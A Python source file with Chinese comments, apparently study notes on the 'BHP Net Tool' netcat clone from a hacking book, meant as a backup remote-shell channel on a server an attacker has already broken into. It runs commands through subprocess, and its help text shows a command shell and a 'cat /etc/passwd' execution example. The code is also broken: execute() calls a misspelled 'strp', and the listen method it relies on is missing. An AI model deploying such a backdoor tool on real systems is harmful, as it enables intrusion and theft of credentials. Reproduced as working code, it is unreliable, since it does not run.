"""
        netcat是网络编程界的“瑞士军刀”，理所当然，很多精明的系统管理员都会将它从系统里移除。
        这个好用的工具对于闯入系统的攻击者来说是不错的资源。
        你可以用它在网络中任意读/写数据，也就意味着你能远程执行命令，四处传送文件，甚至留下一个远程shell。
"""
"""
        当遇到没装netcat，却装了Python的服务器。
        在这种情况下，要是能创建一个简单的网络客户端和服务端用来传送文件、远程执行命令，则大有用武之地。
        如果你通过某个Web应用攻入了系统，那么在你“玩炸”自己的某个木马或后门之前，先“反弹”一个Python会话作为备用通道也绝对是明智之举。
"""
import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

'''
    我们导入了需要的所有Python库，并创建了execute函数。
    这个函数将会接受一条命令并执行，然后将结果作为一段字符串返回。
    subprocess库提供了一组强大的进程创建接口，让你可以通过多种方式调用其他程序。
    我们用到了它的check_output函数，这个函数会在本机运行一条命令，并返回该命令的输出。
'''
def execute(cmd):
    cmd = cmd.strp()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()


class NetCat:
    """
            ①、我们用main代码块传进来的命令行参数和缓冲区数据，初始化一个NetCat对象。
            ②、然后创建一个socket对象。
            run函数作为NetCat对象的执行入口，它的逻辑其实相当简单：直接把后续的执行移交给其他两个函数。
                ③、如果我们的NetCat对象是接收方，run就执行listen函数；
                ④、如果是发送方，run就执行send函数。
    """
    # initialize the NetCat object with the arguments from the command line and the buffer
    # ①
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        # create the socket object
        # ②
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # the run method is the entry point for managing the NetCat object
    def run(self):
        # the run method delegates execution to tow methods
        # if we setting up a listener, we'll call the listen method
        if self.args.listen:
            # ③
            self.listen()
        # otherwise, we call the send method
        else:
            # ④
            self.send()

    """
            ①、先连接到target和port
            ②、如果这时缓冲区里有数据的话，就先把这些数据发过去。接下来，创建一个try/catch块，这样就能直接用Ctrl+C组合键手动关闭连接。
    """
    def send(self):
        # connect to the target and port
        # ①
        self.socket.connect((self.args.target, self.args.port))
        # if there is a buffer, send the buffer to the target first
        if self.buffer:
            self.socket.send(self.buffer)

        # set the try/catch block, thus we can mannually close the connection with Ctrl+C
        # ②
        try:
            # start a loop to receive data from the target
            # ③
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    # if there is no more data, break out the loop
                    if recv_len < 4096:
                        # ④
                        break
                # print out the response data and pause to get interactive input
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    # send the input and continue the loop
                    # ⑤
                    self.socket.send(buffer.encode())
        # the loop will continue until the keyboard interrupt occurs (Ctrl+C)
        # ⑥
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

"""
    解析命令行参数并调用其他函数
    ①、使用标准库里的argparse库创建了一个带命令行界面的程序，传递不同的参数，就能控制这个程序执行不同的操作，
    比如上传文件、远程执行命令，或是打开一个命令行shell。
    ②、编写了一段帮助信息，程序启动的时候如果发现--help参数，就会显示这段信息。
    ③、我们还添加了6个参数，用来控制程序的行为：
            -c：就会打开一个交互式的命令行shell；
            -e：就会执行一条命令；
            -l：就会创建一个监听器；
            -p：用来指定要通信的端口；
            -t：用来指定要通信的目标IP地址；
            -u：用来指定要上传的文件。
    因为发送方和接收方都会运行这个程序，所以传进来的参数会决定这个程序接下来是要发送数据还是要进行监听。
    使用了-c、-e和-u这三个参数，就意味着要使用-l参数，因为这些行为都只能由接收方来完成。
    而发送方只需要向接收方发起连接，所以它只需要用-t和-p两个参数来指定接收方。
    ④、如果确定了程序要进行监听，我们就在缓冲区里填上空白数据，把空白缓冲区传给NetCat对象。
    反之，我们就把stdin里的数据通过缓冲区传进去。最后调用NetCat类的run函数来启动它。
"""
if __name__ == "__main__":
    # ①
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        # ②
        epilog=textwrap.dedent('''Example:
            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt #upload to file
            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" #execute command
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
            netcat.py -t 192.168.1.108 -p 5555 # connect to server
        ''')
    )
    # ③
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    # ④
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()